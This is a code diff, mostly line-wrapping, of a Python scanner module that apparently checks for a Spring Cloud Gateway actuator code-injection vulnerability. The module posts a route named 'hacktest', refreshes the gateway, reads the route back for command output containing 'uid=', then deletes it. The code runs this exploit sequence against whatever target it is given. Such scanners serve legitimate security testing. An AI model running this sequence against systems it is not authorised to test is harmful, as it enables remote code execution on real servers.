@@ -12,6 +12,7 @@ from json import JSONDecodeError
 from utils.custom_headers import USER_AGENTS, TIMEOUT
 from colorama import Fore
 from utils.logging_config import configure_logger
+
 logger = configure_logger(__name__)
 requests.packages.urllib3.disable_warnings()
 
@@ -46,14 +47,20 @@ def check(url, dns_domain, proxies=None):
     }'''
     target_url = url.strip("/")
     try:
-        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=json_headers, data=payload, verify=False, timeout=TIMEOUT, proxies=proxies)
+        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=json_headers, data=payload,
+                             verify=False, timeout=TIMEOUT, proxies=proxies)
         if res1.status_code != 201:
             return False, {}
-        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
-        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
-        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
-        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
-        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]", extra={"target": target_url})
+        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT,
+                      proxies=proxies)
+        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False,
+                            timeout=TIMEOUT, proxies=proxies)
+        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False,
+                        timeout=TIMEOUT, proxies=proxies)
+        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT,
+                      proxies=proxies)
+        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]",
+                     extra={"target": target_url})
         if res3.status_code == 200 and "uid=" in res3.text:
             logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": res3.url})
             return True, {
